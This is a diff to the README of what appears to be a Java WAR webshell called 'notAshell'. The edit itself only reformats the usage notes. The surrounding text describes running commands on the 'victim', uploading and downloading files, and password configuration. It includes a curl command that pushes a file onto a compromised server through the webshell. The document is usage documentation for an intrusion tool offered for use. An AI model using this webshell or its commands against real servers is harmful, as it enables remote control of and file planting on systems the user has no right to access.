@@ -30,8 +30,9 @@ You need to define the password to use when using this webshell. Modify the `par
 - `download`: Download files from the server
 
 ## Usage
-**Note (1): You need to configure the password in the `web.xml` file**
-**Note (2): The application name depends on the name you give when creating the `war` file. In this case, we will use the name `notAshell`.**
+*Note (1): You need to configure the password in the `web.xml` file*
+
+*Note (2): The application name depends on the name you give when creating the `war` file. In this case, we will use the name `notAshell`.*
 
 ### Obtain basic information (no `action`)
 You can otain Java System properties, global JNDI, hostname and IP configuartion.
@@ -48,6 +49,7 @@ Run a command on the victim PS.
 ### Upload a file (`action = upload`)
 Upload files to the victim.
 - `curl -X POST -F "file=<file_to_upload>" "http://<url>:<port>/notAshell/?pass=Your-Awesome-Pass&action=upload&path=<path_to_upload_at_victim>"`
+
 If the path is not set the file will be placed in the same directory as the webshell.
 
 ## Download file or directory (`action = download`)
